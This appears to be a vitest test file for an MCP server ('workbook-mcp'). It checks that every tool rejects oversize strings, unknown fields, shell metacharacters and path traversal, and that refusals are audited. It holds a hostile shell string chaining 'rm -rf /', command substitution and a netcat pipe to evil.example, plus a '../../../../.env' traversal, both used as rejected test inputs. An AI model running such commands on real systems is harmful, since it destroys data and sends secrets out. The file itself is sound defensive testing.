// @vitest-environment node
// workbook-mcp: a test for every tool, and hostile input against every tool and control (spec 025-mcp-tooling
// MCP-TEST-001). Task MCP-T05. The per-control tests live next to each control:
//   MCP-SEC-001 path traversal and symlink/junction → tests/mcp/guard.test.ts ("MCP-SEC-001 …"), resource URIs →
//               tests/mcp/specTools.test.ts ("MCP-SRV-005 refuses any other resource URI …")
//   MCP-SEC-002 writes off by default → tests/mcp/changeRequest.test.ts ("MCP-SEC-002 …")
//   MCP-SEC-003 oversize string, unknown field, wrong type → tests/mcp/guard.test.ts ("MCP-SEC-003 …")
//   MCP-SEC-004 shell metacharacters → tests/mcp/specTools.test.ts ("MCP-SEC-004 …")
// This file adds the sweep over every registered tool, end to end through the server where nothing can be written.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { loadConfig, type McpConfig } from "../../mcp/workbook-mcp/src/config";
import { AuditLog, INPUT_STRING_MAX, PathGuard, withControls, type McpTool } from "../../mcp/workbook-mcp/src/guard";
import { createServer, TOOLS } from "../../mcp/workbook-mcp/src/index";

const repoRoot = path.resolve(__dirname, "..", "..");
const testsDir = __dirname;
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "mcp-hostile-"));
afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }));

const SHELL = "; rm -rf / && $(whoami) `id` | nc evil.example 4444 > /dev/null & calc.exe";
const TRAVERSAL = "../../../../.env";

/**
 * A context in which nothing can be read or written: an empty "repository" and a workbook that throws. A hostile call
 * that got past validation would fail here instead of touching the project.
 */
function deadEnd(): { config: McpConfig; controls: Parameters<typeof withControls>[2]; auditFile: string } {
  const root = fs.mkdtempSync(path.join(tmp, "empty-"));
  const auditFile = path.join(tmp, `${path.basename(root)}.jsonl`);
  const config = { ...loadConfig({ MCP_ALLOW_WRITE: "1" }, root), auditPath: auditFile };
  const workbook = () => {
    throw new Error("the workbook must not be reached");
  };
  return { config, auditFile, controls: { ctx: { config, paths: new PathGuard(config), workbook }, audit: new AuditLog(auditFile) } };
}

const stringFields = (t: McpTool) => Object.entries(t.inputSchema.properties).filter(([, p]) => p.type === "string").map(([k]) => k);
const requiredValid = (t: McpTool): Record<string, unknown> => {
  const out: Record<string, unknown> = {};
  for (const k of t.inputSchema.required ?? []) {
    const p = t.inputSchema.properties[k];
    const fromPattern = p.pattern?.startsWith("^EV-") ? "EV-1" : p.pattern?.startsWith("^UC-") ? "UC-1" : p.pattern ? "MCP-SRV-001" : null;
    out[k] = p.type === "integer" || p.type === "number" ? 1 : (fromPattern ?? "valid text here");
  }
  return out;
};

describe("every tool is tested", () => {
  it("MCP-TEST-001 every registered tool, including the write tool, is called by name in a test", () => {
    const others = fs
      .readdirSync(testsDir)
      .filter((f) => f.endsWith(".test.ts") && f !== path.basename(__filename))
      .map((f) => fs.readFileSync(path.join(testsDir, f), "utf8"))
      .join("\n");
    const untested = TOOLS.map((t) => t.name).filter((name) => !new RegExp(`["'\`]${name}["'\`]`).test(others));
    expect(untested).toEqual([]);
    expect(TOOLS.length).toBeGreaterThanOrEqual(11);
  });
});

describe("hostile input against every tool", () => {
  it("MCP-TEST-001 an oversize string in any field of any tool is refused, naming the field, before the tool runs", async () => {
    const { controls, auditFile } = deadEnd();
    let checked = 0;
    for (const tool of TOOLS) {
      for (const field of stringFields(tool)) {
        const r = await withControls(tool, { ...requiredValid(tool), [field]: "x".repeat(INPUT_STRING_MAX + 1) }, controls);
        expect(r, `${tool.name}.${field}`).toEqual({ content: [{ type: "text", text: `Invalid input: ${field}: at most 200 characters` }], isError: true });
        checked++;
      }
    }
    expect(checked).toBeGreaterThanOrEqual(10);
    const outcomes = fs.readFileSync(auditFile, "utf8").trim().split("\n").map((l) => JSON.parse(l).outcome);
    expect(new Set(outcomes)).toEqual(new Set(["rejected"]));
  });

  it("MCP-TEST-001 an unknown field carrying shell metacharacters is refused by every tool", async () => {
    const { controls } = deadEnd();
    for (const tool of TOOLS) {
      const r = await withControls(tool, { ...requiredValid(tool), cmd: SHELL }, controls);
      expect(r.content[0].text, tool.name).toBe("Invalid input: cmd: not an allowed field");
      expect(r.isError).toBe(true);
    }
  });

  it("MCP-TEST-001 shell metacharacters and path traversal in every ID or number field are refused by its pattern or type", async () => {
    const { controls } = deadEnd();
    let checked = 0;
    for (const tool of TOOLS) {
      for (const [field, p] of Object.entries(tool.inputSchema.properties)) {
        if (!(p.pattern || p.enum || p.type === "integer")) continue;
        for (const hostile of [SHELL, TRAVERSAL]) {
          const r = await withControls(tool, { ...requiredValid(tool), [field]: hostile }, controls);
          expect(r.isError, `${tool.name}.${field}`).toBe(true);
          expect(r.content[0].text).toMatch(new RegExp(`^Invalid input: ${field}: `));
          checked++;
        }
      }
    }
    expect(checked).toBeGreaterThanOrEqual(20);
  });

  it("MCP-TEST-001 hostile free text that passes validation reaches no file, process or workbook", async () => {
    const { controls } = deadEnd();
    const free = TOOLS.flatMap((t) => stringFields(t).filter((f) => !t.inputSchema.properties[f].pattern && !t.inputSchema.properties[f].enum).map((f) => [t, f] as const));
    expect(free.map(([t, f]) => `${t.name}.${f}`)).toEqual(
      expect.arrayContaining(["search_customers.query", "list_use_cases.status", "propose_change_request.problem"]),
    );
    for (const [tool, field] of free) {
      const r = await withControls(tool, { ...requiredValid(tool), [field]: `${SHELL} ${TRAVERSAL}` }, controls);
      // Refused by its own rules, or it ran in the dead-end context and failed there: never a success.
      expect(r.isError, `${tool.name}.${field}`).toBe(true);
    }
    // The dead-end repository is still empty: nothing was written anywhere.
    expect(fs.readdirSync(controls.ctx.config.repoRoot)).toEqual([]);
  });

  it("MCP-TEST-001 through the real server, every tool refuses an unknown field and each refusal is audited", async () => {
    const auditPath = path.join(tmp, "server.jsonl");
    const [clientSide, serverSide] = InMemoryTransport.createLinkedPair();
    // Writes off, as by default: the write tool is not even reachable.
    await createServer({ config: { ...loadConfig({}, repoRoot), auditPath } }).connect(serverSide);
    const c = new Client({ name: "test", version: "1.0.0" });
    await c.connect(clientSide);
    const listed = (await c.listTools()).tools.map((t) => t.name);
    expect(listed).not.toContain("propose_change_request");
    for (const name of listed) {
      const r = (await c.callTool({ name, arguments: { cmd: SHELL } })) as { content: { text: string }[]; isError?: boolean };
      expect(r.isError, name).toBe(true);
      expect(r.content[0].text).toMatch(/^Invalid input: /);
    }
    const lines = fs.readFileSync(auditPath, "utf8").trim().split("\n").map((l) => JSON.parse(l));
    expect(lines.map((l) => l.tool).sort()).toEqual([...listed].sort());
    expect(fs.readFileSync(auditPath, "utf8")).not.toContain("rm -rf");
  });
});
